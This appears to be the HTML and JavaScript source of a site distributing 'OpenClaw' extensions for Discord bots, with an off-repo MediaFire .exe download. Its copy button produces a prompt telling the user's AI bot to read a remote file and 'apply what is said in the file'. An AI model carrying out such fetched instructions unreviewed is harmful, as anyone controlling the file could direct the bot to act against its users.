---
layout: default
---
<head>
<link rel="icon" type="image/png" href="https://warecario.github.io/OpenClaw-Extensions/assets/webicon.png?v=3">
</head>

<link rel="stylesheet" href="assets/css/style.css">

<div id="nav-container">
    <button class="nav-tab active" onclick="showTab(this, 'home')">Home</button>
    <button class="nav-tab" onclick="showTab(this, 'extensions')">Extensions</button>
    <button class="nav-tab" onclick="showTab(this, 'license')">License</button>
</div>

<div id="home-view" class="view active">
    <div class="card">
        <h3 style="color: #fff;">Read Before Use</h3>
        <p>OpenClaw Extensions (for Discord) — By Warecario</p>
        
        <div style="margin: 20px 0; padding: 15px; background: #1e1e1e; border-radius: 4px; border-left: 4px solid #007acc;">
            <a href="https://download937.mediafire.com/bvlh9qpwanjg6b8pL2Q_A0ObWllXQyznD6TbimtDoOoXsrlWgWMNNK1ZPXbU3rNBd8xCig59_Yj-74iLmO6RawCvy-tMoBysn-f6P5Frfq3H56SPmdJz1DmwdD37o8mBV0b_Ck0eA6YFfF4TaIy43BLZpuSL_E_dxs21kg1akVVANXU/je8xs0n47bktcol/OC-CarioPlugins-1-0.exe" 
               style="color: #007acc !important; font-weight: bold; text-decoration: none; font-size: 16px;">
               App For Windows
            </a>
        </div>

        <hr style="border: 0; border-top: 1px solid #333; margin: 20px 0;">
        <h4>How to use:</h4>
        <ol>
            <li>Browse extensions in the <b>Extensions</b> tab.</li>
            <li>Click an extension to view details.</li>
            <li>Click the <b>Copy</b> button to get the install prompt.</li>
            <li>Paste the prompt to your bot to install.</li>
        </ol>
    </div>
</div>

<div id="extensions-view" class="view">
    <div class="app-container">
        <div class="sidebar">
            <input type="text" id="search-bar" placeholder="Search extensions..." onkeyup="filterExtensions()">
            <div id="extension-list">
                <p style="padding:20px; color:#858585;">Loading Extensions...</p>
            </div>
        </div>
        <div class="details-panel" id="details-panel">
            <div class="placeholder-text">Select an extension from the list</div>
        </div>
    </div>
</div>

<div id="license-view" class="view">
    <div class="card">
        <h3>License</h3>
        <p><b>All Rights Reserved (ARR)</b></p>
        <hr style="border: 0; border-top: 1px solid #333; margin: 20px 0;">
        <div style="color: #e1e1e1;">
            <p>These files can be used by everybody. But only Warecario may make, distribute, or sell these projects.</p>
        </div>
    </div>
</div>

<script>
const GITHUB_USER = "Warecario";
const GITHUB_REPO = "OpenClaw-Extensions";

let allExtensions = [];

async function loadData() {
    const listDiv = document.getElementById('extension-list');
    try {
        // Fetch from ROOT of the repo
        const res = await fetch(`https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents`);
        if (!res.ok) throw new Error("API Connection Failed");
        const files = await res.json();
        
        allExtensions = files.filter(f => {
            const n = f.name.toLowerCase();
            return (n.endsWith('.cario2weak') || n.endsWith('.octweak')) && n !== 'template.cario2weak';
        });

        renderList(allExtensions);
    } catch (err) {
        listDiv.innerHTML = `<p style="padding:20px; color:#ff6b6b;">Check internet connection or repo settings.</p>`;
    }
}

function formatName(name) {
    return name.replace(/\.(cario2weak|octweak)$/, '').replace(/[-_]/g, ' ').toUpperCase();
}

function renderList(list) {
    const container = document.getElementById('extension-list');
    if (!container) return;
    if (list.length === 0) {
        container.innerHTML = "<p style='padding:20px;'>No extensions found in root.</p>";
        return;
    }
    container.innerHTML = list.map(ext => `
        <button class="ext-item" onclick="selectExtension('${ext.name}', '${ext.download_url}')">
            ${formatName(ext.name)}
        </button>
    `).join('');
}

function filterExtensions() {
    const query = document.getElementById('search-bar').value.toLowerCase();
    const filtered = allExtensions.filter(ext => ext.name.toLowerCase().includes(query));
    renderList(filtered);
}

function selectExtension(name, url) {
    const panel = document.getElementById('details-panel');
    panel.innerHTML = `
        <h2 style="margin-top:0; color: #fff;">${formatName(name)}</h2>
        <p style="color:#858585; margin-bottom: 30px;">File: <code>${name}</code></p>
        <button class="copy-btn" onclick="copyPrompt('${url}', this)">Copy Install Prompt</button>
    `;
}

function copyPrompt(url, btn) {
    navigator.clipboard.writeText(`Read the file at this link: ${url} and apply what is said in the file.`);
    btn.innerText = "Copied!";
    btn.style.background = "#007acc";
    setTimeout(() => { 
        btn.innerText = "Copy Install Prompt"; 
        btn.style.background = "#16825d";
    }, 2000);
}

function showTab(btnElement, tabId) {
    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
    document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
    document.getElementById(tabId + '-view').classList.add('active');
    btnElement.classList.add('active');
}

loadData();
</script>
